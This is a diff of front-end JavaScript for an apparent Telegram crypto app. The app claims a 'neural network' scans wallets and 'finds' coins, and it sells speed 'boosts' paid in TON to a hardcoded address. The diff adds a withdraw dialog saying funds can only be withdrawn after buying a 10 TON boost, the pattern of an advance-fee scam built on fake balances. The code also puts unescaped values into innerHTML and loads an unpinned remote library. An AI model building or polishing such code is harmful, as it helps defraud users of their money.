@@ -3,7 +3,7 @@
   'use strict';
 
   const API_BASE = '';
-  const MANIFEST_PATH = '/tonconnect-manifest.json'; // <- переконайтесь, що файл саме з дефісом
+  const MANIFEST_PATH = '/tonconnect-manifest.json';
 
   const PAGES = {
     scan: document.getElementById('page-scan'),
@@ -45,17 +45,11 @@
   let baseScanDelay = 2000;
   let currentProfile = null;
 
-  // Help: завантаження зовнішнього скрипта, якщо не підключено в HTML
   function loadScript(src) {
     return new Promise((resolve, reject) => {
-      if (document.querySelector(`script[src="${src}"]`)) {
-        // вже підключений
-        resolve();
-        return;
-      }
+      if (document.querySelector(`script[src="${src}"]`)) { resolve(); return; }
       const s = document.createElement('script');
-      s.src = src;
-      s.async = true;
+      s.src = src; s.async = true;
       s.onload = () => resolve();
       s.onerror = () => reject(new Error('Script load error: ' + src));
       document.head.appendChild(s);
@@ -64,34 +58,22 @@
 
   async function initTonConnect() {
     const tonBtnRoot = document.getElementById('tonConnectBtn');
-    if (!tonBtnRoot) {
-      console.warn('tonConnectBtn not found in DOM');
-      return;
-    }
-
+    if (!tonBtnRoot) return;
     const manifestUrl = window.location.origin + MANIFEST_PATH;
-
-    // Перевірка доступності маніфесту — щоб уникнути Cannot GET /...
     try {
       const r = await fetch(manifestUrl, { method: 'GET' });
       if (!r.ok) {
-        console.error('Manifest fetch failed:', r.status, r.statusText);
         showBoostMessage('⚠️ TON manifest not available at ' + MANIFEST_PATH + '. Place the file in public/ and ensure correct name.', 'error');
         return;
       }
     } catch (e) {
-      console.error('Manifest fetch error:', e);
       showBoostMessage('⚠️ Failed to fetch TON manifest. Check file and CORS.', 'error');
       return;
     }
 
-    // Завантажити бібліотеку якщо її нема
     try {
-      if (!window.TON_CONNECT_UI) {
-        await loadScript('https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js');
-      }
+      if (!window.TON_CONNECT_UI) await loadScript('https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js');
     } catch (e) {
-      console.error('Failed to load TON Connect UI script:', e);
       showBoostMessage('⚠️ Failed to load TON Connect UI library.', 'error');
       return;
     }
@@ -103,7 +85,6 @@
       });
 
       tonConnectUI.onStatusChange(wallet => {
-        // Підтримати різні форми відповіді
         let addr = null;
         try {
           addr = wallet && (
@@ -131,7 +112,6 @@
         }
       });
     } catch (e) {
-      console.error('TON Connect init failed:', e);
       showBoostMessage('⚠️ TON Connect initialization failed. Check manifest and library.', 'error');
     }
   }
@@ -159,13 +139,11 @@
     if (!boostPanelInfo) return;
     boostPanelInfo.innerText = msg;
     boostPanelInfo.style.display = 'block';
-
     const colors = {
       success: { bg: 'rgba(16, 185, 129, 0.15)', border: 'rgba(16, 185, 129, 0.4)', color: '#10b981' },
       error: { bg: 'rgba(239, 68, 68, 0.15)', border: 'rgba(239, 68, 68, 0.4)', color: '#ef4444' },
       info: { bg: 'rgba(6, 182, 212, 0.15)', border: 'rgba(6, 182, 212, 0.4)', color: '#06b6d4' }
     };
-
     const style = colors[type] || colors.info;
     boostPanelInfo.style.background = style.bg;
     boostPanelInfo.style.borderColor = style.border;
@@ -198,7 +176,6 @@
   function updateNeuralStatus(profile) {
     if (!profile) return;
     const now = Date.now();
-
     if (scanning && now - lastNetworkChange > 10000) {
       statusNetwork.innerText = getRandomNetwork();
       lastNetworkChange = now;
@@ -217,7 +194,6 @@
     statusSpeed.innerText = `${profile.speedMultiplier || 1}x`;
     statusOnline.innerText = '●';
     statusOnline.style.animation = scanning ? 'pulse-scale 1s infinite' : 'none';
-
     headerSpeed.innerText = `${profile.speedMultiplier || 1}x`;
     headerRate.innerText = `${(profile.findRate * 100).toFixed(0)}%`;
 
@@ -242,7 +218,7 @@
   function updateTelegramUser(profile) {
     if (profile && profile.telegramUser) {
       const user = profile.telegramUser;
-      telegramUsername.innerText = user.username ? `@${user.username}` : user.first_name || 'User';
+      telegramUsername.innerText = user.username ? `@${user.username}` : (user.first_name || 'User');
       if (user.photo_url) {
         telegramAvatar.src = user.photo_url;
       } else if (user.username) {
@@ -252,8 +228,12 @@
         telegramAvatar.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=8b5cf6&color=fff&size=128`;
       }
       telegramUserDiv.classList.remove('hidden');
+    } else if (profile && profile.wallet && profile.wallet.address) {
+      const wa = profile.wallet.address;
+      telegramUsername.innerText = wa;
+      telegramAvatar.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(wa)}&background=8b5cf6&color=fff&size=128`;
+      telegramUserDiv.classList.remove('hidden');
     } else {
-      // сховати, якщо немає
       telegramUserDiv.classList.add('hidden');
     }
   }
@@ -268,7 +248,6 @@
     try {
       const p = await fetchProfile();
       currentProfile = p;
-
       updateNeuralStatus(p);
       updateTelegramUser(p);
 
@@ -279,7 +258,6 @@
         const balance = p.balances[k];
         const usdInfo = p.usdBalances && p.usdBalances[k];
         const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
-
         li.innerHTML = `
           <div class="label">${k}</div>
           <div class="amount">
@@ -304,42 +282,25 @@
       if (profileBalancesList) {
         profileBalancesList.innerHTML = '';
         let nonZero = 0;
-
         for (const k of keys) {
-          const balance = p.balances[k];
-          if (balance <= 0) continue;
-          nonZero++;
+          const balance = Number(p.balances[k] || 0);
+          if (balance > 0) nonZero++;
           const usdInfo = p.usdBalances && p.usdBalances[k];
           const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
-
           const item = document.createElement('div');
           item.className = 'profile-balance-item';
-
           item.innerHTML = `
             <div class="balance-info">
               <div class="balance-crypto">${k}</div>
               <div class="balance-amount">${fmtAmount(balance)} ≈ $${usdText}</div>
             </div>
             <div class="balance-actions">
-              <button class="btn-withdraw" data-crypto="${k}">
-                Withdraw
-              </button>
+              <button class="btn-withdraw" data-crypto="${k}">Withdraw</button>
             </div>
           `;
           profileBalancesList.appendChild(item);
         }
-
         if (nonZeroCount) nonZeroCount.innerText = nonZero;
-
-        // handlers
-        document.querySelectorAll('.btn-withdraw').forEach(btn => {
-          btn.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            const crypto = this.getAttribute('data-crypto');
-            handleWithdraw(crypto);
-          });
-        });
       }
     } catch (e) {
       console.error('Profile refresh error:', e);
@@ -352,30 +313,21 @@
       showBoostMessage('⚠️ Please connect your TON wallet first', 'error');
       return;
     }
-
     const amountInNano = amount * 1000000000;
     const TON_RECEIVE_ADDRESS = currentProfile?.tonReceiveAddress || 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';
-
     try {
       showBoostMessage('📤 Preparing transaction...', 'info');
-
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{
-          address: TON_RECEIVE_ADDRESS,
-          amount: amountInNano.toString()
-        }]
+        messages: [{ address: TON_RECEIVE_ADDRESS, amount: amountInNano.toString() }]
       };
-
       const result = await tonConnectUI.sendTransaction(transaction);
       showBoostMessage('⏳ Transaction sent! Confirming...', 'info');
-
       const res = await fetch(API_BASE + '/api/confirm-boost', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ amount, txHash: result.boc || result })
       });
-
       const r = await res.json();
       if (r.success) {
         showBoostMessage(`✅ Boost activated! Speed: ${r.speedMultiplier}x | Find Rate: ${(r.findRate * 100).toFixed(0)}%`, 'success');
@@ -405,29 +357,20 @@
         body: JSON.stringify({})
       });
       const j = await res.json();
-
       if (j.result && j.result.found) {
         const { crypto, amount } = j.result;
         const usdInfo = j.usdBalances && j.usdBalances[crypto];
         const usdText = usdInfo ? fmtUSD(usdInfo.usd) : '0.00';
-
-        scanResult.innerHTML = `
-          <span class="result-icon">🎉</span>
-          <span>Found ${fmtAmount(amount)} ${crypto} ($${usdText})!</span>
-        `;
+        scanResult.innerHTML = `<span class="result-icon">🎉</span><span>Found ${fmtAmount(amount)} ${crypto} ($${usdText})!</span>`;
         scanResult.style.background = 'rgba(16, 185, 129, 0.15)';
         scanResult.style.borderColor = 'rgba(16, 185, 129, 0.4)';
         scanResult.style.color = '#10b981';
       } else {
-        scanResult.innerHTML = `
-          <span class="result-icon">🔍</span>
-          <span>Scanning... Wallet #${j.scannedWallets || 0}</span>
-        `;
+        scanResult.innerHTML = `<span class="result-icon">🔍</span><span>Scanning... Wallet #${j.scannedWallets || 0}</span>`;
         scanResult.style.background = 'rgba(6, 182, 212, 0.08)';
         scanResult.style.borderColor = 'rgba(6, 182, 212, 0.2)';
         scanResult.style.color = '#06b6d4';
       }
-
       await refreshProfile();
     } catch (e) {
       console.error('Scan error:', e);
@@ -437,24 +380,19 @@
   async function startContinuousScan() {
     if (scanning) return;
     scanning = true;
-
     startScanBtn.classList.add('hidden');
     stopScanBtn.classList.remove('hidden');
-
     scanResult.innerHTML = `<span class="result-icon">⚡</span><span>Neural network activated...</span>`;
     scanResult.style.background = 'rgba(139, 92, 246, 0.15)';
     scanResult.style.borderColor = 'rgba(139, 92, 246, 0.4)';
     scanResult.style.color = '#8b5cf6';
-
     while (scanning) {
       try {
         const p = await fetchProfile();
         currentProfile = p;
         updateNeuralStatus(p);
-
         const mult = p.speedMultiplier || 1;
         const effectiveDelay = Math.max(200, Math.round(baseScanDelay / mult));
-
         await scanSingleWallet();
         await new Promise(r => setTimeout(r, effectiveDelay));
       } catch (e) {
@@ -462,43 +400,60 @@
         await new Promise(r => setTimeout(r, baseScanDelay));
       }
     }
-
     scanning = false;
     scanResult.innerHTML = `<span class="result-icon">⏸</span><span>Scan paused</span>`;
     scanResult.style.background = 'rgba(245, 158, 11, 0.15)';
     scanResult.style.borderColor = 'rgba(245, 158, 11, 0.4)';
     scanResult.style.color = '#f59e0b';
-
     startScanBtn.classList.remove('hidden');
     stopScanBtn.classList.add('hidden');
-
     await refreshProfile();
   }
 
   startScanBtn.addEventListener('click', () => startContinuousScan());
   stopScanBtn.addEventListener('click', () => { scanning = false; });
 
+  // Delegated withdraw handler
+  document.addEventListener('click', function(e) {
+    const btn = e.target.closest && e.target.closest('.btn-withdraw');
+    if (!btn) return;
+    e.preventDefault();
+    e.stopPropagation();
+    const crypto = btn.getAttribute('data-crypto') || btn.dataset.crypto;
+    handleWithdraw(crypto);
+  });
+
   function handleWithdraw(crypto) {
-    console.log('handleWithdraw called for:', crypto);
-    const modal = document.getElementById('withdrawModal');
-    if (!modal) {
-      console.error('Modal not found!');
-      return;
+    try {
+      const modal = document.getElementById('withdrawModal');
+      if (!modal) {
+        console.error('Modal not found!');
+        return;
+      }
+      modal.classList.add('active');
+      modal.style.display = 'flex';
+      modal.setAttribute('aria-hidden', 'false');
+      modal.style.zIndex = 9999;
+      const reqText = modal.querySelector('.modal-text');
+      if (reqText) {
+        reqText.innerHTML = `To withdraw <strong>${crypto}</strong>, you need to purchase at least a <strong>Basic Boost (10 TON)</strong>.`;
+      }
+      const primary = modal.querySelector('.modal-footer .gradient-btn.full');
+      if (primary) primary.focus();
+    } catch (e) {
+      console.error('Error in handleWithdraw:', e);
     }
-    modal.classList.remove('hidden');
-    modal.style.display = 'flex'; // явне показування
-    modal.setAttribute('aria-hidden', 'false');
-    modal.style.zIndex = 9999;
-    const primary = modal.querySelector('.modal-footer .gradient-btn.full');
-    if (primary) primary.focus();
   }
 
   window.closeWithdrawModal = function() {
-    const modal = document.getElementById('withdrawModal');
-    if (modal) {
-      modal.classList.add('hidden');
+    try {
+      const modal = document.getElementById('withdrawModal');
+      if (!modal) return;
+      modal.classList.remove('active');
       modal.style.display = 'none';
       modal.setAttribute('aria-hidden', 'true');
+    } catch (e) {
+      console.error('Error closing withdraw modal:', e);
     }
   };
 
@@ -509,11 +464,11 @@
     navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === 'boost'));
   };
 
+  // Telegram WebApp integration
   if (window.Telegram && window.Telegram.WebApp) {
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
-
     const user = tg.initDataUnsafe.user;
     if (user) {
       fetch(API_BASE + '/api/store-telegram', {
@@ -530,11 +485,9 @@
     console.log('App initializing...');
     await refreshProfile();
     initTonConnect();
-
     setInterval(() => {
       if (currentProfile) updateNeuralStatus(currentProfile);
     }, 2000);
-
     console.log('App initialized');
   }
 
